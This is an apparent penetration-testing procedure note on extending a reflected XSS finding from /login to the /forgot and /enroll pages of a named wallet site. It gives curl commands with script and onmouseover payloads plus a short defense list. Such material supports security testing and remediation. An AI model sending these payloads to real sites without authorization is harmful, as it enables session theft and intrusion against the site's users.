---
id: proc-verify-xss-additional-endpoints
tags:
  - xss
  - scope-expansion
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/submit-xss-login-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:35.279Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify XSS on Additional Endpoints

## Summary

Test the XSS vulnerability on related endpoints like /forgot and /enroll pages by injecting payloads into input fields, assessing the broader impact of poor sanitization.

## Description

The root cause is systemic insufficient output escaping across forms. This procedure confirms the issue extends beyond /login, using similar payloads in email or input fields on /forgot and /enroll 1,2,3 pages.

## Requirements

1. Access to /forgot and /enroll endpoints
2. Form inspection for parameters and tokens
3. curl for submissions

## Defense

Defensive measures and detection strategies:

- Apply consistent input validation and escaping site-wide
- Audit all user-controlled inputs in error responses
- Use vulnerability scanners to check multiple endpoints

## Objectives

1. Map the full scope of the vulnerability
2. Identify patterns in sanitization failures
3. Quantify risk across application flows

## Instructions

### Step 1: Target /forgot Page

**Context**: Inject into the email field of the forgot password form.

**Command** ([[commands/submit-xss-login-payload]] adapted):
```bash
curl -X POST https://wallet.romit.io/forgot \
  -d "email[]=<script>alert(document.cookie)</script>&_csrf=token" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

> Check error page for execution.

### Step 2: Test /enroll Pages

**Context**: Repeat for enroll 1,2,3 input fields.

**Command** ([[commands/submit-xss-login-payload]] adapted):
```bash
curl -X POST https://wallet.romit.io/enroll \
  -d "input=<a onmouseover=alert(1)>test</a>&_csrf=token" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

> Verify reflection and trigger on each.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/submit-xss-login-payload]]

## Tools Used

- None

## Tags

- [[xss]]
- [[multi-endpoint]]
- [[verification]]
